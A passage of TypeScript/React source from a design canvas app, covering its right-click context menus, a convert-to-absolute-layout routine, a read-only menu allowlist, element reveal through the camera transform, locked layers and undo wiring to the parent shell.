      cs.transform === 'none'
    );
  };

  type ConvertChildBox = {
    id: string;
    idIndex?: number;
    left: number;
    top: number;
    width: number;
    height: number;
  };
  type ConvertEntry = {
    containerId?: string;
    containerSetRelative: boolean;
    freezeSize?: { width: number; height: number };
    children: ConvertChildBox[];
  };

  /**
   * Convert an entire SUBTREE to absolute in one batch: `rootEl` is either the
   * artboard body (artboard-level, `rootId` undefined) or a right-clicked
   * container (element-level, `rootId` = its cd-id — the root itself keeps its
   * flow position; only its descendants freeze). Exactly ONE confirm per
   * invocation (skippable), an in-flight guard so double-invocations can't
   * stack dialogs, and the rest happens in the background.
   */
  const runSubtreeConvert = async (
    rootEl: HTMLElement,
    rootId: string | undefined,
    artboardId: string,
    opts?: { skipConfirm?: boolean }
  ): Promise<void> => {
    const w = window as unknown as { __maudeConvertBusy?: boolean };
    if (w.__maudeConvertBusy) return;
    w.__maudeConvertBusy = true;
    try {
      const body = rootEl.closest('.dc-artboard-body') ?? rootEl;
      const zoom = worldZoomFor(rootEl) || 1;
      const containers: ConvertEntry[] = [];
      const dissolve: string[] = [];
      let unstamped = 0;
      let repeated = 0;
      const countIn = (cid: string): number => {
        try {
          return body.querySelectorAll(`[data-cd-id="${CSS.escape(cid)}"]`).length;
        } catch {
          return 99;
        }
      };
      const measure = (el: HTMLElement, vs: HTMLElement): Omit<ConvertChildBox, 'id'> => {
        const r = el.getBoundingClientRect();
        const sRect = vs.getBoundingClientRect();
        const scs = getComputedStyle(vs);
        const borderL = Number.parseFloat(scs.borderLeftWidth) || 0;
        const borderT = Number.parseFloat(scs.borderTopWidth) || 0;
        return {
          left: Math.round((r.left - sRect.left) / zoom - borderL),
          top: Math.round((r.top - sRect.top) / zoom - borderT),
          width: Math.round(r.width / zoom),
          height: Math.round(r.height / zoom),
        };
      };
      const walk = (
        containerEl: HTMLElement,
        survivingEl: HTMLElement,
        survivingEntry: ConvertEntry
      ): void => {
        for (const c of Array.from(containerEl.children) as HTMLElement[]) {
          if (c.closest('.dgn-pin, .dc-cv-halo, .dc-cv-group-bbox')) continue;
          const cid = c.getAttribute('data-cd-id');
          if (!cid) {
            unstamped += 1;
            continue;
          }
          const count = countIn(cid);
          if (count > 1) repeated += 1;
          const hasStampedKids = !!c.querySelector('[data-cd-id]');
          const dissolvable = hasStampedKids && count === 1 && isUnstyledWrapper(c);
          if (dissolvable) {
            dissolve.push(cid);
            walk(c, survivingEl, survivingEntry);
            continue;
          }
          const idIndex =
            count > 1
              ? Math.max(
                  0,
                  Array.from(body.querySelectorAll(`[data-cd-id="${CSS.escape(cid)}"]`)).indexOf(c)
                )
              : undefined;
          survivingEntry.children.push({
            id: cid,
            ...(idIndex !== undefined ? { idIndex } : {}),
            ...measure(c, survivingEl),
          });
          if (hasStampedKids && count === 1) {
            const entry: ConvertEntry = {
              containerId: cid,
              containerSetRelative: getComputedStyle(c).position === 'static',
              children: [],
            };
            containers.push(entry);
            walk(c, c, entry);
          }
          // A repeated (component-instance) container freezes as a WRAPPED
          // unit — we don't descend into shared internals (per-instance inner
          // edits need detach; the whole instance is draggable via its box).
        }
      };
      const rootEntry: ConvertEntry = {
        ...(rootId !== undefined ? { containerId: rootId } : {}),
        containerSetRelative:
          rootId !== undefined && getComputedStyle(rootEl).position === 'static',
        // The element-level root keeps its FLOW position but its auto height
        // would collapse once all children go absolute — freeze its box.
        ...(rootId !== undefined
          ? {
              freezeSize: {
                width: Math.round(rootEl.getBoundingClientRect().width / zoom),
                height: Math.round(rootEl.getBoundingClientRect().height / zoom),
              },
            }
          : {}),
        children: [],
      };
      containers.push(rootEntry);
      walk(rootEl, rootEl, rootEntry);
      const nonEmpty = containers.filter((c) => c.children.length > 0 || c.containerSetRelative);
      const total = nonEmpty.reduce((n, c) => n + c.children.length, 0);
      if (total === 0) {
        showCanvasToast('Nothing to convert — no selectable elements here.');
        return;
      }
      if (unstamped > 0) {
        showCanvasToast('Some elements have no id — edit the canvas via chat first, then convert.');
        return;
      }
      // ONE confirm for the WHOLE subtree (user steer: "stačí jednou a zbytek
      // proveď na pozadí"). Skipped entirely for kind-switch (the shell/canvas
      // already asked there).
      if (opts?.skipConfirm !== true) {
        const parts = [
          `Freeze all ${total} elements at their current positions (position: absolute)?`,
          dissolve.length > 0
            ? `${dissolve.length} invisible layout wrapper(s) will be removed — the tree flattens.`
            : 'Every element becomes freely draggable — the layout will no longer reflow.',
          'This is a one-way change (⌘Z right after still reverts it).',
        ];
        if (repeated > 0) {
          parts.push(
            `${repeated} element(s) render from shared components — each instance keeps its own frozen position.`
          );
        }
        const ok = await canvasConfirm(parts.join('\n'), {
          title:
            rootId !== undefined
              ? 'Convert this container to absolute?'
              : 'Convert artboard layout to absolute?',
          confirmLabel: 'Convert all',
        });
        if (!ok) return;
      }
      try {
        window.parent.postMessage(
          {
            dgn: 'convert-to-absolute-request',
            artboardId,
            allowShared: repeated > 0,
            containers: nonEmpty,
            ...(dissolve.length > 0 ? { dissolve } : {}),
          },
          '*'
        );
      } catch {
        /* detached / cross-origin */
      }
    } finally {
      w.__maudeConvertBusy = false;
    }
  };

  // Element context menu — recursive over the clicked container's subtree.
  const postConvertToAbsolute = async (containerEl: HTMLElement): Promise<void> => {
    const containerId = containerEl.getAttribute('data-cd-id');
    if (!containerId) {
      showCanvasToast('That container has no id yet — edit it via chat first, then convert.');
      return;
    }
    const artboardId =
      (containerEl.closest('[data-dc-screen]') as HTMLElement | null)?.getAttribute(
        'data-dc-screen'
      ) ?? '';
    if (!artboardId) return;
    if (cdIdCountInArtboard(containerEl, containerId) > 1) {
      showCanvasToast(
        'This container is a repeated/component instance — convert isn\u2019t supported for it yet.'
      );
      return;
    }
    await runSubtreeConvert(containerEl, containerId, artboardId);
  };
  // Artboard-level (context menu + kind switch).
  const postConvertArtboardToAbsolute = async (
    artboardId: string,
    opts?: { skipConfirm?: boolean }
  ): Promise<void> => {
    const body = document.querySelector(
      `[data-dc-screen="${CSS.escape(artboardId)}"] .dc-artboard-body`
    ) as HTMLElement | null;
    if (!body) return;
    await runSubtreeConvert(body, undefined, artboardId, opts);
  };

  // Publish for the CanvasRouter's `freeze-and-set-kind` handler (different
  // scope; window-level so it survives soft HMR, same as __maudeLastLayersArt).
  (
    window as unknown as { __maudeConvertArtboard?: typeof postConvertArtboardToAbsolute }
  ).__maudeConvertArtboard = postConvertArtboardToAbsolute;

  const registry: ContextRegistry = {
    element: [
      [
        {
          id: 'add-comment',
          label: 'Add comment',
          shortcut: 'C',
          onSelect: postComposeForTarget,
        },
        {
          id: 'copy-css',
          label: 'Copy CSS',
          shortcut: '⌘⇧C',
          onSelect: (target) => {
            if (!target.el) return;
            copy(cssPath(target.el));
          },
        },
        {
          id: 'copy-id',
          label: 'Copy data-cd-id',
          onSelect: (target) => {
            if (target.cdId) copy(target.cdId);
          },
        },
        {
          id: 'inspect',
          label: 'Inspect',
          shortcut: '⌥I',
          onSelect: (target) => {
            // Phase 12 — select the right-clicked element + open the shell's
            // right Inspector panel (Inspect / Layers / CSS). Was a disabled TODO
            // before the inspector shipped.
            if (target.el) {
              selSet.replace(
                hoverTargetToSelection({
                  el: target.el,
                  cdId: target.cdId ?? null,
                  artboardId: target.artboardId ?? null,
                } as HoverTarget)
              );
            }
            try {
              window.parent.postMessage({ dgn: 'open-inspector' }, '*');
            } catch {
              /* detached / cross-origin */
            }
          },
        },
        {
          // feature-photo-editor (Task 16) — only on a content-addressed `<img>`.
          // Selects it (so the Inspector derives the Photo target from the
          // selection's `photoAsset`) + opens the Inspector on the Photo tab.
          id: 'edit-photo',
          label: 'Edit Photo…',
          hidden: (target) => {
            const el = target.el as HTMLImageElement | null;
            if (el?.tagName?.toLowerCase() !== 'img') return true;
            return !/assets\/[0-9a-f]{8}\.[a-z0-9]+/i.test(el.getAttribute?.('src') || '');
          },
          onSelect: (target) => {
            if (target.el) {
              selSet.replace(
                hoverTargetToSelection({
                  el: target.el,
                  cdId: target.cdId ?? null,
                  artboardId: target.artboardId ?? null,
                } as HoverTarget)
              );
            }
            try {
              window.parent.postMessage({ dgn: 'open-inspector', tab: 'photo' }, '*');
            } catch {
              /* detached / cross-origin */
            }
          },
        },
        {
          id: 'select-layer',
          label: 'Select layer',
          // Task L6 — every DISTINCT stamped ancestor in the cursor's full hit
          // stack (elementsFromPoint sees through overlapping/nested elements a
          // single elementFromPoint pick can't reach), Layers-order (topmost
          // first), so overlapping/deeply-nested TSX becomes grabbable. A
          // function submenu — resolved per-click against `target`, since the
          // candidate set depends on where the user right-clicked.
          //
          // v1 scope: no live Stage-H local/shared badge on each candidate —
          // that resolver is server-side/main-origin-only (`GET /_api/edit-scope`,
          // canvas-edit.ts), unreachable from this iframe without a new
          // request/reply round-trip; deferred rather than blocking this task.
          onSelect: () => {
            /* parent of a submenu — never invoked directly */
          },
          submenu: (t) => buildSelectLayerSubmenu(t, selSet),
        },
      ],
      [
        {
          id: 'insert-element',
          label: 'Insert',
          // feature-element-editing-robustness Stage I3 — insert a synthesized
          // element AFTER the right-clicked one (main-origin write: request it
          // from the parent shell). Image insert needs an asset src (the Stage-F
          // AssetPicker), so only Div/Text are offered here for now.
          submenu: [
            {
              id: 'insert-div',
              label: 'Div',
              onSelect: (target) => {
                if (!target.cdId) return;
                try {
                  window.parent.postMessage(
                    { dgn: 'insert-request', refId: target.cdId, position: 'after', kind: 'div' },
                    '*'
                  );
                } catch {
                  /* detached */
                }
              },
            },
            {
              id: 'insert-text',
              label: 'Text',
              onSelect: (target) => {
                if (!target.cdId) return;
                try {
                  window.parent.postMessage(
                    { dgn: 'insert-request', refId: target.cdId, position: 'after', kind: 'text' },
                    '*'
                  );
                } catch {
                  /* detached */
                }
              },
            },
            {
              id: 'insert-image',
              label: 'Image…',
              // Image needs a contained asset src — the shell opens the AssetPicker.
              onSelect: (target) => {
                if (!target.cdId) return;
                try {
                  window.parent.postMessage(
                    { dgn: 'insert-image-request', refId: target.cdId, position: 'after' },
                    '*'
                  );
                } catch {
                  /* detached */
                }
              },
            },
          ],
          onSelect: () => {},
        },
        {
          id: 'replace-media',
          label: 'Replace image…',
          // Stage F2 — re-point an authored <img>/<video> src. Only meaningful on
          // a media element; on anything else it's a no-op (the shell's edit-attr
          // will refuse a non-media / expression src). The Media inspector section
          // carries the primary, always-gated "Replace…" button.
          onSelect: (target) => {
            const tag = target.el?.tagName?.toLowerCase();
            if (!target.cdId || (tag !== 'img' && tag !== 'video')) return;
            // Read the authored src straight off the element so the shell has the
            // undo before-value (getAttribute is the literal content attr, not the
            // resolved URL).
            const before = target.el?.getAttribute('src') ?? null;
            try {
              window.parent.postMessage(
                { dgn: 'replace-media-request', id: target.cdId, before },
                '*'
              );
            } catch {
              /* detached */
            }
          },
        },
        {
          // feature-4 T8 (convert-to-absolute, DDR-188) — the Figma "Remove auto
          // layout" analogue. Only shown on a container with stamped children;
          // freezes each child's computed box and rewrites them to
          // position:absolute so they can be dragged freely.
          id: 'convert-to-absolute',
          label: 'Convert children to absolute position',
          hidden: (target) => !convertibleChildrenOf(target.el),
          onSelect: (target) => {
            if (target.el) postConvertToAbsolute(target.el as HTMLElement);
          },
        },
      ],
      [exportItem('export-selection', 'Export selection…', 'selection', '⌘E')],
      [
        {
          id: 'duplicate-element',
          label: 'Duplicate',
          shortcut: '⌘D',
          // Task L3 — main-origin source duplicate; post to the parent shell.
          onSelect: (target) => {
            if (!target.cdId) return;
            try {
              window.parent.postMessage({ dgn: 'duplicate-request', id: target.cdId }, '*');
            } catch {
              /* detached / cross-origin */
            }
          },
        },
        {
          id: 'copy-style',
          label: 'Copy style',
          shortcut: '⌘⌥C',
          // Task L4 — the shell captures the current selection's authored style.
          onSelect: () => {
            try {
              window.parent.postMessage({ dgn: 'copy-style' }, '*');
            } catch {
              /* detached / cross-origin */
            }
          },
        },
        {
          id: 'paste-style',
          label: 'Paste style',
          shortcut: '⌘⌥V',
          onSelect: (target) => {
            if (!target.cdId) return;
            try {
              window.parent.postMessage({ dgn: 'paste-style', id: target.cdId }, '*');
            } catch {
              /* detached / cross-origin */
            }
          },
        },
        {
          id: 'delete-element',
          label: 'Delete',
          shortcut: '⌫',
          destructive: true,
          // feature-element-editing-robustness Stage I — request a source delete.
          // The write is main-origin-only (DDR-054): post to the parent shell,
          // which performs it (pinned to the active canvas) + records undo.
          onSelect: (target) => {
            if (!target.cdId) return;
            try {
              window.parent.postMessage({ dgn: 'delete-request', id: target.cdId }, '*');
            } catch {
              /* detached / cross-origin */
            }
          },
        },
        {
          id: 'hide',
          label: 'Hide',
          shortcut: '⌘⇧H',
          onSelect: (target) => {
            if (target.el) (target.el as HTMLElement).style.visibility = 'hidden';
          },
        },
        {
          id: 'deselect',
          label: 'Deselect',
          shortcut: 'Esc',
          onSelect: () => clearSelection(),
        },
      ],
    ],
    'artboard-chrome': [
      [
        // issue-90 — right-click on an artboard's own label/border chrome
        // (outside its body, where `data-cd-id` never resolves) had no
        // "Add comment" entry at all; only a hit inside the body counted as
        // `element`. Anchors at the click point (no element under it).
        {
          id: 'add-comment',
          label: 'Add comment',
          shortcut: 'C',
          onSelect: postComposeForTarget,
        },
      ],
      [
        {
          id: 'fit-one',
          label: 'Fit just this artboard',
          onSelect: (target) => {
            if (!target.artboardId) return;
            focusArtboard(target.artboardId);
          },
        },
        fitItem,
        resetItem,
      ],
      [
        {
          // feature-4 (user steer 2026-07-19) — freeze the WHOLE artboard's
          // layout: every element position:absolute at its current box, so the
          // composition is freely draggable (marketing-graphics flow).
          id: 'convert-artboard-absolute',
          label: 'Convert layout to absolute…',
          onSelect: (target) => {
            if (target.artboardId) void postConvertArtboardToAbsolute(target.artboardId);
          },
        },
      ],
      [
        // DDR-148 — only meaningful (and only enabled) on a video-comp
        // artboard; scopes + opens the shell's Timeline dock.
        {
          id: 'open-timeline',
          label: 'Open Timeline',
          shortcut: '⌘⇧T',
          disabled: (target) => !artboardHasVideo(target.artboardId),
          disabledHint: 'This artboard has no video sequence',
          onSelect: (target) => {
            if (!target.artboardId) return;
            focusArtboard(target.artboardId);
            try {
              window.parent.postMessage(
                { dgn: 'open-timeline-request', artboardId: target.artboardId },
                '*'
              );
            } catch {
              /* detached / cross-origin */
            }
          },
        },
      ],
      [
        // G7 — align commands. Six modes; gated on ≥ 2 selected artboards
        // (alignment is well-defined with 2). Primary surface is the
        // MultiArtboardToolbar; menu entries are discoverability backup.
        {
          id: 'align-left',
          label: 'Align left',
          disabled: !alignEnabled,
          onSelect: () => alignArtboards('left'),
        },
        {
          id: 'align-center-x',
          label: 'Align center (horizontal)',
          disabled: !alignEnabled,
          onSelect: () => alignArtboards('center-x'),
        },
        {
          id: 'align-right',
          label: 'Align right',
          disabled: !alignEnabled,
          onSelect: () => alignArtboards('right'),
        },
        {
          id: 'align-top',
          label: 'Align top',
          disabled: !alignEnabled,
          onSelect: () => alignArtboards('top'),
        },
        {
          id: 'align-center-y',
          label: 'Align center (vertical)',
          disabled: !alignEnabled,
          onSelect: () => alignArtboards('center-y'),
        },
        {
          id: 'align-bottom',
          label: 'Align bottom',
          disabled: !alignEnabled,
          onSelect: () => alignArtboards('bottom'),
        },
      ],
      [
        // T24 — distribute commands. Primary surface is the floating
        // MultiArtboardToolbar above the group bbox; the menu entries are
        // a discoverability backup. Disabled when fewer than 3 artboards
        // are selected.
        {
          id: 'distribute-h',
          label: 'Distribute horizontally',
          disabled: !distributeEnabled,
          onSelect: () => distributeArtboards('x'),
        },
        {
          id: 'distribute-v',
          label: 'Distribute vertically',
          disabled: !distributeEnabled,
          onSelect: () => distributeArtboards('y'),
        },
      ],
      [themeItem, kindItem, duplicateAtBreakpointItem],
      [
        {
          id: 'delete-artboard',
          label: 'Delete artboard',
          shortcut: '⌫',
          destructive: true,
          // Main-origin-only source delete (DDR-054): post to the parent shell,
          // which performs it (pinned to the active canvas) + records undo. The
          // engine refuses to delete the last artboard.
          onSelect: (target) => {
            if (!target.artboardId) return;
            try {
              window.parent.postMessage(
                { dgn: 'delete-artboard-request', artboardId: target.artboardId },
                '*'
              );
            } catch {
              /* detached / cross-origin */
            }
          },
        },
      ],
      [exportItem('export-artboard', 'Export this artboard…', 'artboard')],
    ],
    world: [
      // issue-90 — right-click on empty canvas background (no artboard, no
      // element) had no "Add comment" entry at all. Anchors at the click
      // point, same as the comment tool's own floating-pin fallback.
      [
        {
          id: 'add-comment',
          label: 'Add comment',
          shortcut: 'C',
          onSelect: postComposeForTarget,
        },
      ],
      [fitItem, resetItem],
      [
        exportItem('export-canvas', 'Export canvas as separate…', 'canvas-as-separate'),
        exportItem('export-project', 'Export project (ZIP)…', 'project-raw'),
      ],
    ],
    overlay: [],
  };
  return filterRegistryForReadOnly(registry);
}

/**
 * Cloud Phase 25 C2 — a read-only canvas keeps only the context-menu items
 * that READ the project (navigate, inspect, copy, export). Everything else is
 * ABSENT, not disabled. Deliberately an ALLOWLIST: a future item defaults to
 * absent for viewers (the C1 posture), rather than leaking in by omission.
 * `add-comment` joins when Phase 25 C3 lands comments on the cell's read-only
 * allowlist.
 */
const READ_ONLY_MENU_IDS = new Set([
  'fit-view',
  'reset-view',
  'fit-one',
  'open-timeline',
  'copy-css',
  'copy-id',
  'copy-style',
  'inspect',
  'select-layer',
  'deselect',
  'export-selection',
  'export-artboard',
  'export-canvas',
  'export-project',
]);

function filterRegistryForReadOnly(registry: ContextRegistry): ContextRegistry {
  if (!isReadOnlyCanvas()) return registry;
  const out = {} as ContextRegistry;
  for (const key of Object.keys(registry) as (keyof ContextRegistry)[]) {
    out[key] = registry[key]
      .map((section) => section.filter((item) => READ_ONLY_MENU_IDS.has(item.id)))
      .filter((section) => section.length > 0);
  }
  return out;
}

// ─────────────────────────────────────────────────────────────────────────────
// Task A1 (feature-element-editing-robustness) — camera-aware reveal.
//
// The `select-by-id` channel (Layers-panel click, restored/echoed selection,
// post-edit reselect) used to `scrollIntoView({block:'nearest'})` to reveal the
// selected element. But `.dc-canvas` / `.dc-artboard-body` are `overflow:hidden`
// engine clip layers, and the camera is the `.dc-world` transform — so a host
// scroll shifted the layout out from under the camera model (a phantom right
// strip, and the pan reset after an absolute-element move: Bugs A + B). Reveal
// THROUGH the camera instead: measure the element's live screen box and, only
// when it's off-screen, pan the world transform the minimal amount to bring the
// nearest out-of-view edge in. Screen-space deltas → `controller.panBy` (which
// reads the exact live viewport), so it's self-correcting regardless of any
// model lag and never touches host scroll.

/** Distance (screen px) a canvas element is allowed to sit from the viewport
 *  edge after a reveal — a small inset so a just-revealed element isn't flush
 *  against the frame. */
export const REVEAL_MARGIN_PX = 40;

/** Minimal 1-axis delta (screen px) to bring `[elStart, elEnd]` inside
 *  `[viewStart + margin, viewEnd - margin]`. Returns 0 when already visible OR
 *  when the element spans the viewport (bigger than the view — don't move,
 *  matching `scrollIntoView({block:'nearest'})`). Sign matches `panBy`: a
 *  positive delta pans the world content toward the end (down / right). */
export function revealAxisDelta(
  elStart: number,
  elEnd: number,
  viewStart: number,
  viewEnd: number,
  margin: number
): number {
  const vs = viewStart + margin;
  const ve = viewEnd - margin;
  if (elStart >= vs && elEnd <= ve) return 0; // fully visible
  if (elStart <= vs && elEnd >= ve) return 0; // spans the viewport — leave it
  if (elStart < vs) return vs - elStart; // off the start edge → pan toward end
  if (elEnd > ve) return ve - elEnd; // off the end edge → pan toward start
  return 0;
}

/** Pan the camera the minimal amount so `target` is visible inside `host`,
 *  entirely through the world transform (never host scroll). No-op when the
 *  element is already on-screen. Exported for the Task A3 regression test. */
export function revealElementViaCamera(
  host: HTMLElement,
  target: HTMLElement,
  controller: ViewportControllerHandle
): void {
  const hostRect = host.getBoundingClientRect();
  const r = target.getBoundingClientRect();
  if (r.width <= 0 && r.height <= 0) return; // detached / display:none — nothing to reveal
  const dx = revealAxisDelta(r.left, r.right, hostRect.left, hostRect.right, REVEAL_MARGIN_PX);
  const dy = revealAxisDelta(r.top, r.bottom, hostRect.top, hostRect.bottom, REVEAL_MARGIN_PX);
  if (dx !== 0 || dy !== 0) controller.panBy(dx, dy);
}

// ─────────────────────────────────────────────────────────────────────────────
// feature-4 T7b — locked-layer enforcement. The shell owns the padlock UI +
// view.json persistence; the canvas only needs the LIVE set to refuse
// select/drag on locked elements. Window-level (not module `let`) so it
// survives soft HMR re-evaluation, same reasoning as __maudeLastLayersArt.
function lockedKeySet(): Set<string> {
  const w = window as unknown as { __maudeLockedKeys?: Set<string> };
  if (!w.__maudeLockedKeys) {
    w.__maudeLockedKeys = new Set(
      Array.isArray(
        (window as unknown as { __canvas_meta__?: { locked?: unknown } }).__canvas_meta__?.locked
      )
        ? ((window as unknown as { __canvas_meta__?: { locked?: string[] } }).__canvas_meta__
            ?.locked as string[])
        : []
    );
  }
  return w.__maudeLockedKeys;
}

/** Is the element a locked layer? Matches by `cdId:occurrenceIndex` within the
 *  artboard body (same occurrence math the Layers rows use). */
function isLockedElement(el: Element | null, cdId: string | null): boolean {
  if (!el || !cdId) return false;
  const locked = lockedKeySet();
  if (locked.size === 0) return false;
  const body = el.closest('.dc-artboard-body');
  if (!body) return false;
  try {
    const same = Array.from(body.querySelectorAll(`[data-cd-id="${CSS.escape(cdId)}"]`));
    const idx = same.indexOf(el);
    return locked.has(`${cdId}:${idx < 0 ? 0 : idx}`);
  } catch {
    return false;
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Router wire-up

// The shell writes an inspector edit, THEN posts `record-edit` for it. The
// write reaches disk before the shell has its response, so a Cmd+Z pressed in
// that window found the stack one entry short and inverted the edit BELOW the
// one on screen — refused as "changed by someone else", or worse, applied.
// Before undo/redo, ask the shell to answer once its recordable writes have
// settled. Messages between two windows arrive in order, so every
// `record-edit` those writes produce is delivered before the answer. Bounded:
// a shell that never answers costs a short wait, not the undo.
export function afterShellRecords(timeoutMs = 3000): Promise<void> {
  if (typeof window === 'undefined' || window.parent === window) return Promise.resolve();
  const requestId = `ub-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 8)}`;
  return new Promise<void>((resolve) => {
    const done = () => {
      clearTimeout(timer);
      window.removeEventListener('message', onReply);
      resolve();
    };
    const onReply = (e: MessageEvent) => {
      const d = e.data as { dgn?: string; requestId?: string } | null;
      if (e.source === window.parent && d?.dgn === 'undo-barrier-ok' && d.requestId === requestId)
        done();
    };
    const timer = setTimeout(done, timeoutMs);
    window.addEventListener('message', onReply);
    try {
      window.parent.postMessage({ dgn: 'undo-barrier', requestId }, '*');
    } catch {
      done();
    }
  });
}

function CanvasRouter({
  hostRef,
  children,
  distributeArtboards,
  alignArtboards,
}: {
  hostRef: RefObject<HTMLDivElement | null>;
  children: ReactNode;
  distributeArtboards: (axis: 'x' | 'y') => void;
  alignArtboards: (mode: 'left' | 'right' | 'center-x' | 'top' | 'bottom' | 'center-y') => void;
}) {
  const { tool, setTool, resetTool, clearSticky } = useToolMode();
  const selSet = useSelectionSet();
  const annotSel = useAnnotationSelection();
  const ctxMenu = useContextMenu();
  const undoStack = useUndoStack();
  const undoSinks = useUndoSinks();
  // Latest undo stack, read inside long-lived listeners (text-edit dblclick)
  // without making them a hook dependency — avoids re-binding on every undo op.
  const undoStackRef = useRef(undoStack);
  undoStackRef.current = undoStack;
  // Selection readback can refresh while the user is typing (e.g. the shell's
  // post-HMR halo restore). Keep the editor's lifetime tied to its host, not
  // the changing selection snapshot, or effect cleanup silently ends typing.
  const textSelectionRef = useRef(selSet);
  textSelectionRef.current = selSet;

  // Phase: inline-edit undo (DDR-103/104 follow-up). Wire the `editSourceApplyFn`
  // sink so an `edit-source` command's do()/undo() reaches the main-origin-only
  // `/_api/edit-*` write — which the untrusted canvas iframe can't call (DDR-054).
  // It posts `dgn:'apply-edit'` to the parent shell, which performs the write.
  //
  // The shell answers with `dgn:'apply-edit-result'`. do()/undo() await it, so
  // a refusal (a teammate changed the value since — audit 2026-09-13 P1 #5 —
  // or any failed write) rejects, the stack keeps the entry instead of moving
  // its cursor, and the user is told why.
  useEffect(() => {
    // HMR replaces this React subtree, not the iframe or the parent write.
    // Drain already-sent requests after cleanup instead of losing their ACK
    // (and, on conflict, their user-facing refusal). Timers remain bounded.
    let disposed = false;
    const pending = new Map<
      string,
      { resolve: () => void; reject: (err: Error) => void; timer: ReturnType<typeof setTimeout> }
    >();
    const detachIfIdle = () => {
      if (disposed && pending.size === 0) window.removeEventListener('message', onResult);
    };
    const onResult = (event: MessageEvent) => {
      if (event.source !== window.parent) return;
      const data = event.data as
        | { dgn?: unknown; requestId?: unknown; ok?: unknown; error?: unknown; conflict?: unknown }
        | undefined;
      if (data?.dgn !== 'apply-edit-result' || typeof data.requestId !== 'string') return;
      const entry = pending.get(data.requestId);
      if (!entry) return;
      pending.delete(data.requestId);
      clearTimeout(entry.timer);
      detachIfIdle();
      if (data.ok === true) {
        entry.resolve();
        return;
      }
      const reason = typeof data.error === 'string' && data.error ? data.error : 'the edit failed';
      // A conflict's reason already reads as a sentence ("color was changed by
      // someone else — kept their value"); it applies to undo and redo alike.
      showCanvasToast(data.conflict === true ? reason : `Couldn't apply — ${reason}`, 'warning');
      entry.reject(new Error(reason));
    };
    window.addEventListener('message', onResult);
    let sequence = 0;
    const applyFn: EditSourceApplyFn = (apply) =>
      new Promise<void>((resolve, reject) => {
        if (disposed) {
          reject(new Error('the canvas closed'));
          return;
        }
        sequence += 1;
        const requestId = `${Date.now().toString(36)}-${sequence}-${Math.random().toString(36).slice(2, 8)}`;
        // Generous: the shell serializes these writes behind any in-flight one.
        const timer = setTimeout(() => {
          pending.delete(requestId);
          detachIfIdle();
          reject(new Error('the edit was not confirmed'));
        }, 30_000);
        pending.set(requestId, { resolve, reject, timer });
        try {
          window.parent.postMessage({ dgn: 'apply-edit', requestId, ...apply }, '*');
        } catch {
          /* detached / cross-origin teardown — nothing to apply */
          pending.delete(requestId);
          clearTimeout(timer);
          detachIfIdle();
          reject(new Error('the canvas is detached'));
        }
      });
    undoSinks.setSink('editSourceApplyFn', applyFn);
    return () => {
      disposed = true;
      detachIfIdle();
      undoSinks.setSink('editSourceApplyFn', undefined);
    };
  }, [undoSinks]);

  // Phase 12.1 — reorder undo. Same origin-split shape as editSourceApplyFn:
  // the reorder-revert write is main-origin-only, so the command's do()/undo()
  // posts `dgn:'reorder-revert'` and the shell calls /_api/reorder-revert.
  useEffect(() => {
    const revertFn: ReorderRevertFn = (revert) => {
      try {
        window.parent.postMessage({ dgn: 'reorder-revert', ...revert }, '*');
      } catch {
        /* detached / cross-origin teardown — nothing to revert */
      }
    };
    undoSinks.setSink('reorderRevertFn', revertFn);
    return () => undoSinks.setSink('reorderRevertFn', undefined);
  }, [undoSinks]);

  // Shell View-menu zoom bridge (dgn:'zoom') — same controller the zoom pill uses.
  const zoomController = useViewportControllerContext();
  // Shell View-menu chrome-visibility bridge (dgn:'view-chrome') — minimap /
  // zoom-controls toggles + Presentation Mode. Drives the shared chrome store
  // the floating chrome (DCMiniMap, DCZoomToolbar, ToolPalette, AnnotationsLayer)
  // consumes.
  const chromeCtx = useChromeVisibility();

  // Dogfood follow-up (print artboards) — self-seed the per-canvas persisted
  // overlay visibility (view.json `overlays.guides`/`overlays.print`, GET-
  // merged into `window.__canvas_meta__` by _shell.html before mount) into
  // the chrome store, once per mount. This seed originally lived in
  // DesignCanvasInner (canvas-lib.tsx) — but that component renders
  // CanvasShell as its CHILD, and ChromeVisibilityProvider mounts INSIDE
  // CanvasShell, so DesignCanvasInner's own useChromeVisibility() was always
  // null and the seed silently never ran (dead since the foundation feature;
  // the generic `guides` toggle had no UI yet, so nothing surfaced it —
  // "Show print guides" is its first real consumer). CanvasRouter sits
  // inside the provider (it's the view-chrome bridge), so the seed works
  // here. Absent keys stay HIDDEN (the T6 gotcha — an old view.json must
  // not suddenly paint guides nobody asked for).
  const overlaysSeededRef = useRef(false);
  useEffect(() => {
    if (overlaysSeededRef.current || !chromeCtx) return;
    overlaysSeededRef.current = true;
    const w = window as unknown as {
      __canvas_meta__?: { overlays?: Record<string, boolean> };
    };
    const overlays = w.__canvas_meta__?.overlays;
    if (!overlays) return;
    const patch: { guides?: boolean; print?: boolean } = {};
    if (overlays.guides === true) patch.guides = true;
    if (overlays.print === true) patch.print = true;
    if (Object.keys(patch).length > 0) chromeCtx.setChrome(patch);
  }, [chromeCtx]);

  // Task A2 (feature-element-editing-robustness) — host-scroll-0 invariant.
  // `.dc-canvas` (overflow:hidden) and each `.dc-artboard-body` are the engine's
  // clip layers; the camera lives entirely in the `.dc-world` transform, and
  // both `writeTransform` and `__maudeCanvasRects` assume these hosts sit at
  // scroll 0. A stray programmatic scroll (a residual scrollIntoView, focus()
  // auto-scroll of an overflow:hidden ancestor) would shift the layout and
  // desync the camera model — the Bug A/B class. Clamp any scroll on an ENGINE
  // clip layer straight back to 0. Author scroll containers deeper inside a mock
  // are left alone (the target check excludes them). `scroll` events don't
  // bubble, so capture:true is what lets the host observe a descendant clip's
  // scroll without also intercepting author-content scrolls (those fail the
  // engine-clip test and pass through).
  useEffect(() => {
    const host = hostRef.current;
    if (!host) return;
    const clamp = (e: Event) => {
      const t = e.target;
      if (!(t instanceof HTMLElement)) return;
      const isEngineClip =
        t === host ||
        t.classList.contains('dc-artboard-body') ||
        t.classList.contains('dc-artboard');
      if (!isEngineClip) return;
      if (t.scrollLeft !== 0) t.scrollLeft = 0;
      if (t.scrollTop !== 0) t.scrollTop = 0;
    };
    host.addEventListener('scroll', clamp, true);
    return () => host.removeEventListener('scroll', clamp, true);
  }, [hostRef]);

  // Hover state drives the floating .dc-cv-halo--hover overlay. The overlay
  // itself reads getBoundingClientRect on every rAF tick to follow pan/zoom.
  const [hoverEl, setHoverEl] = useState<Element | null>(null);

  // rAF-coalesced hover dispatcher. `pointermove` fires hundreds of times/sec
